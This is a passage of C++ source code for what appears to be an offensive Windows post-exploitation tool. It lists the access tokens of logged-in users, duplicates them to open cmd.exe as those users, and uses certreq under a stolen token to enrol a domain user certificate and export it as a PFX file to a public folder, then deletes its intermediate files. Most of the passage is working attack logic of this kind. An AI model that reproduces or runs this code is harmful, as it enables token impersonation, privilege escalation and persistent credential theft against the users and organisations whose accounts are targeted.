        else if (wcscmp(token.TokenType, L"Impersonation") == 0) {
            if (wcscmp(token.TokenImpersonationLevel, L"N/A") != 0)
                detailLevel = token.TokenImpersonationLevel;
        }

        wprintf(L"  ID: %-3d | Type: %-15ls | Level/Integrity: %-15ls\n",
            token.DisplayId,
            token.TokenType,
            detailLevel);
    }
    wprintf(L"\n");
}


bool RunCommandAsToken(const TOKEN& tokenInfo, const std::wstring& originalCommandLine) {
   
    std::wstring commandToExecute = originalCommandLine;
    std::wstring executablePath = L"";
    bool useCmd = false;

    std::wstring commandLower = originalCommandLine;
    std::transform(commandLower.begin(), commandLower.end(), commandLower.begin(), ::towlower);

    size_t firstSpace = commandLower.find(L' ');
    std::wstring firstWord = (firstSpace == std::wstring::npos) ? commandLower : commandLower.substr(0, firstSpace);

    const wchar_t* fileName = PathFindFileNameW(firstWord.c_str());
    if (fileName == nullptr) fileName = firstWord.c_str();


    if (wcscmp(fileName, L"certreq.exe") == 0 || wcscmp(fileName, L"powershell.exe") == 0) {
        useCmd = true;

        commandToExecute = L"cmd /c \"" + originalCommandLine + L"\"";
 
    }
    else {
        executablePath = L"";
        commandToExecute = originalCommandLine;
    }

    wprintf(L"\tExecuting: %ls\n", commandToExecute.c_str());

    HANDLE hPrimaryToken = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default");
    bool success = false;
    DWORD lastError = 0;

    if (!DuplicateTokenEx(tokenInfo.TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) { 
       
        return false;
    }
   

    DWORD targetSessionId = (g_currentSessionId != (DWORD)-1) ? g_currentSessionId : tokenInfo.SessionId;
    if (targetSessionId != (DWORD)-1) {
        if (SetTokenInformation(hPrimaryToken, TokenSessionId, &targetSessionId, sizeof(DWORD))) {
       
        }
        else {
            
        }
    }
    else {
   
    }

    wchar_t mutableCommandLine[COMMAND_LENGTH];
    wcscpy_s(mutableCommandLine, COMMAND_LENGTH, commandToExecute.c_str());

    std::wstring currentDir = StringToWString(PUBLIC_PATH);

 
    if (CreateProcessAsUserW(hPrimaryToken,
        NULL,
        mutableCommandLine,
        NULL, NULL, FALSE,
        CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
        NULL,
        currentDir.c_str(),
        &si, &pi))
    {
   
        success = true;
    }
    else {
        lastError = GetLastError();
    

        if (g_currentProcessIntegrity >= SECURITY_MANDATORY_HIGH_RID) {
     
            if (CreateProcessWithTokenW(hPrimaryToken,
                LOGON_WITH_PROFILE,
                NULL,
                mutableCommandLine,
                CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                NULL,
                currentDir.c_str(),
                &si, &pi))
            {
           
                success = true;
            }
            else {
                lastError = GetLastError();
                
            }
        }
    }

    if (success) {
     
        WaitForSingleObject(pi.hProcess, INFINITE);


        DWORD exitCode = 0;
        if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
          
            if (exitCode != 0) {
              

            }
        }
        else {
           
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hPrimaryToken);

    return success;
}


void CleanupTokenHandles() {
    if (!g_discoveredTokens.empty()) {
        
        for (auto& token : g_discoveredTokens) {
            if (token.TokenHandle != NULL) {
                CloseHandle(token.TokenHandle);
                token.TokenHandle = NULL;
            }
        }
        g_discoveredTokens.clear();
    }
}


void RequestCertificateForToken(int tokenId) {
   
    // Find the selected token
    const TOKEN* pSelectedToken = nullptr;
    for (const auto& token : g_discoveredTokens) {
        if (token.DisplayId == tokenId) {
            pSelectedToken = &token;
            break;
        }
    }

    if (pSelectedToken == nullptr) {
       
        return;
    }

  

     // 1. Get Username 
    std::string username = WStringToString(pSelectedToken->UsernameOnly);
    if (username.empty()) {
        wprintf(L"[!] Error: Could not get valid username for token ID %d. Aborting request.\n", tokenId);
        return;
    }

     // Define unique file paths for this user
    std::string infFilePath = PUBLIC_PATH + INF_FILENAME_PREFIX + username + ".inf";
    std::string csrFilePath = PUBLIC_PATH + CSR_FILENAME_PREFIX + username + ".csr";
    std::string cerFilePath = PUBLIC_PATH + CER_FILENAME_PREFIX + username + ".cer";
    std::string pfxFilePath = PUBLIC_PATH + username + ".pfx";

    std::wstring winfFilePath = StringToWString(infFilePath);
    std::wstring wcsrFilePath = StringToWString(csrFilePath);
    std::wstring wcerFilePath = StringToWString(cerFilePath);
    std::wstring wThumbprintFilePath = StringToWString(THUMBPRINT_FILENAME); 

    bool stepSuccess = true;

    // 2. Generate INF File
   
    if (generateINF(username, g_userDnsDomain, infFilePath).empty()) {
       
        stepSuccess = false;
    }

    // 3. Run certreq -new
    if (stepSuccess) {
    
        std::wstring cmdNew = L"certreq -new \"" + winfFilePath + L"\" \"" + wcsrFilePath + L"\"";
        if (!RunCommandAsToken(*pSelectedToken, cmdNew)) {
          
            stepSuccess = false;
        }
    }

    // 4. Run certreq -submit
    if (stepSuccess) {

        std::wstring cmdSubmit = L"certreq -submit -attrib \"CertificateTemplate:user\" \"" + wcsrFilePath + L"\" \"" + wcerFilePath + L"\"";
        if (!RunCommandAsToken(*pSelectedToken, cmdSubmit)) {
          
            stepSuccess = false;
        }
    }

    // 5. Run certreq -accept
    if (stepSuccess) {

        std::wstring cmdAccept = L"certreq -accept \"" + wcerFilePath + L"\"";
        if (!RunCommandAsToken(*pSelectedToken, cmdAccept)) {
        

            stepSuccess = false;
        }
    }


    if (stepSuccess) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }


    std::string thumbprint = "";
    if (stepSuccess) {
      
        std::wstring cmdThumb = getLatestThumbprintCommand();
        if (!RunCommandAsToken(*pSelectedToken, cmdThumb)) {
           
            stepSuccess = false;
        }
        else {

            thumbprint = readThumbprintFromFile();
            if (thumbprint.empty()) {
           
                stepSuccess = false;
            }
            else {
               
            }
        }
    }

    // 7. Export PFX 
    if (stepSuccess) {
       
        std::wstring cmdExport = exportPFXCommand(thumbprint, username);
        if (!RunCommandAsToken(*pSelectedToken, cmdExport)) {
           

            stepSuccess = false;
        }
        else {

        }
    }

    if (!stepSuccess) {
       
    }

   
    DeleteFileW(winfFilePath.c_str());
    DeleteFileW(wcsrFilePath.c_str());
    DeleteFileW(wcerFilePath.c_str());
    DeleteFileW(wThumbprintFilePath.c_str());


}

void OpenCmdAsToken(const TOKEN& tokenInfo) {
    

    HANDLE hPrimaryToken = NULL; PROCESS_INFORMATION pi = { 0 }; STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = const_cast<LPWSTR>(L"winsta0\\default"); // Make it interactive
    bool processCreated = false; DWORD lastError = 0;

    // 1. Duplicate Token
    if (!DuplicateTokenEx(tokenInfo.TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) { wprintf(L"[!] DuplicateTokenEx failed. Error: %lu\n", GetLastError()); return; }
  

    // 2. Set Session ID (Best effort)
    DWORD targetSessionId = (g_currentSessionId != (DWORD)-1) ? g_currentSessionId : tokenInfo.SessionId; if (targetSessionId != (DWORD)-1) { SetTokenInformation(hPrimaryToken, TokenSessionId, &targetSessionId, sizeof(DWORD)); }

    // 3. Prepare Command Line & Directory
    wchar_t mutableCommandLine[COMMAND_LENGTH]; wcscpy_s(mutableCommandLine, COMMAND_LENGTH, L"C:\\Windows\\System32\\cmd.exe"); std::wstring currentDir = StringToWString(PUBLIC_PATH);

    // 4. Create Process (Try AsUser first)
 
    if (CreateProcessAsUserW(hPrimaryToken, NULL, mutableCommandLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir.c_str(), &si, &pi))
    {
     
    }
    else { lastError = GetLastError();
    if (lastError == 1314) { 
        if (CreateProcessWithTokenW(hPrimaryToken, LOGON_WITH_PROFILE, NULL, mutableCommandLine, CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, currentDir.c_str(), &si, &pi)) { wprintf(L"[*]   CreateProcessWithTokenW succeeded. CMD launched (PID: %lu)\n", pi.dwProcessId); processCreated = true; } else { lastError = GetLastError(); wprintf(L"[!]   CreateProcessWithTokenW also failed. Error: %lu\n", lastError); } 
    } else { 
    }

    }

    // 5. Cleanup handles (Important: Close process/thread handles for the launched CMD)
    if (processCreated) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    CloseHandle(hPrimaryToken);

    if (!processCreated) { wprintf(L"[-] Failed to launch CMD for Token ID %d.\n", tokenInfo.DisplayId); }
    wprintf(L"--- Finished CMD launch attempt for Token ID: %d ---\n", tokenInfo.DisplayId);
}

// --- Main Entry Point ---
int wmain(int argc, wchar_t* argv[]) {
    

    if (!InitializePrivileges()) {
        std::wcout << L"[!] Warning: Failed to enable some privileges. Functionality may be limited." << std::endl;
    }

   
    g_userDnsDomain = GetUserDnsDomain();
    if (g_userDnsDomain.empty()) {
        std::wcout << L"[-] Could not determine user DNS domain" << std::endl;
     
    }
   
    // Add a 3-second delay
    std::this_thread::sleep_for(std::chrono::seconds(3));

  

    if (!ACL_Change::AdjustDesktop()) {
        wprintf(L"[!] Failed to adjust desktop ACLs (Error: %S). CreateProcessAsUser may fail interaction.\n", ACL_Change::GetLastErrorAsString().c_str());
    }


    if (g_userDnsDomain.empty()) {
        int choice = 0;
        do {
            // Display Menu
            std::wcout << L"\n--- Menu ---" << std::endl;
            std::wcout << L"1. Scan and Display Interactive User Tokens" << std::endl;
            std::wcout << L"2. Open cmd.exe" << std::endl;
            std::wcout << L"3. Exit" << std::endl;
            std::wcout << L"Enter your choice: ";

            // Get Input
            std::wcin >> choice;

            // Input Validation
            if (std::wcin.fail()) {
                std::wcout << L"[!] Invalid input. Please enter a number." << std::endl;
                ClearInputBuffer();
                choice = 0;
                continue;
            }
            ClearInputBuffer();


            std::this_thread::sleep_for(std::chrono::seconds(5));

            // Process Choice
            switch (choice) {
            case 1:
                CleanupTokenHandles();
                if (DiscoverAndStoreTokens()) {
                    DisplayTokenList();
                }
                else {
                    std::wcout << L"[-] Token discovery failed." << std::endl;
                }
                break;

            case 2:
                if (g_discoveredTokens.empty()) { std::wcout << L"[!] No tokens discovered..." << std::endl; }
                else {
                    int selectedId = 0; std::wcout << L"\n[*] Enter Token ID to open CMD with: "; std::wcin >> selectedId; if (std::wcin.fail()) { std::wcout << L"[!] Invalid ID." << std::endl; ClearInputBuffer(); }
                    else {
                        ClearInputBuffer();

                        const TOKEN* pSelectedTokenCmd = nullptr;
                        for (const auto& token : g_discoveredTokens) { if (token.DisplayId == selectedId) { pSelectedTokenCmd = &token; break; } }
                        if (pSelectedTokenCmd == nullptr) { wprintf(L"[!] Error: Token ID %d not found.\n", selectedId); }
                        else { OpenCmdAsToken(*pSelectedTokenCmd); }
                    }
                }
                break;

            case 3:
                std::wcout << L"[*] Exiting..." << std::endl;
                break;

            default:
                std::wcout << L"[!] Invalid choice. Please try again." << std::endl;
            }


            std::this_thread::sleep_for(std::chrono::seconds(4));

        } while (choice != 3);

    }
    else {

        int choice = 0;
        do {
            // Display Menu
            std::wcout << L"\n--- Menu ---" << std::endl;
            std::wcout << L"1. Scan and Display Interactive User Tokens" << std::endl;
            std::wcout << L"2. Request Certificate for Selected Token ID" << std::endl;
            std::wcout << L"3. Open cmd.exe" << std::endl;
            std::wcout << L"4. Exit" << std::endl;
            std::wcout << L"Enter your choice: ";

            // Get Input
            std::wcin >> choice;

            // Input Validation
            if (std::wcin.fail()) {
                std::wcout << L"[!] Invalid input. Please enter a number." << std::endl;
                ClearInputBuffer();
                choice = 0;
                continue;
            }
            ClearInputBuffer();


            std::this_thread::sleep_for(std::chrono::seconds(5));

            // Process Choice
            switch (choice) {
            case 1:
                CleanupTokenHandles();
                if (DiscoverAndStoreTokens()) {
                    DisplayTokenList();
                }
                else {
                    std::wcout << L"[-] Token discovery failed." << std::endl;
                }
                break;

            case 2: // Request Certificate
                if (g_discoveredTokens.empty()) {
                    std::wcout << L"[-] No tokens discovered. Please Scan first (Option 1)." << std::endl;
                }
                else {
                    int selectedId = 0;
                    std::wcout << L"\n[*] Enter the ID of the token to use for certificate request: ";
                    std::wcin >> selectedId;

                    if (std::wcin.fail()) {
                        std::wcout << L"[-] Invalid input. Please enter a number for the ID." << std::endl;
                        ClearInputBuffer();
                    }
                    else {
                        ClearInputBuffer();
                        RequestCertificateForToken(selectedId);
                    }
                }
                break;
            case 3:
                if (g_discoveredTokens.empty()) { std::wcout << L"[!] No tokens discovered..." << std::endl; }
                else {
                    int selectedId = 0; std::wcout << L"\n[*] Enter Token ID to open CMD with: "; std::wcin >> selectedId; if (std::wcin.fail()) { std::wcout << L"[!] Invalid ID." << std::endl; ClearInputBuffer(); }
                    else {
                        ClearInputBuffer();

                        const TOKEN* pSelectedTokenCmd = nullptr;
                        for (const auto& token : g_discoveredTokens) { if (token.DisplayId == selectedId) { pSelectedTokenCmd = &token; break; } }
                        if (pSelectedTokenCmd == nullptr) { wprintf(L"[!] Error: Token ID %d not found.\n", selectedId); }
                        else { OpenCmdAsToken(*pSelectedTokenCmd); }
                    }
                }
                break;

            case 4:
                std::wcout << L"[*] Exiting..." << std::endl;
                break;

            default:
                std::wcout << L"[!] Invalid choice. Please try again." << std::endl;
            }


            std::this_thread::sleep_for(std::chrono::seconds(4));

        } while (choice != 3);

    }
    
    CleanupTokenHandles();
    return 0;
}
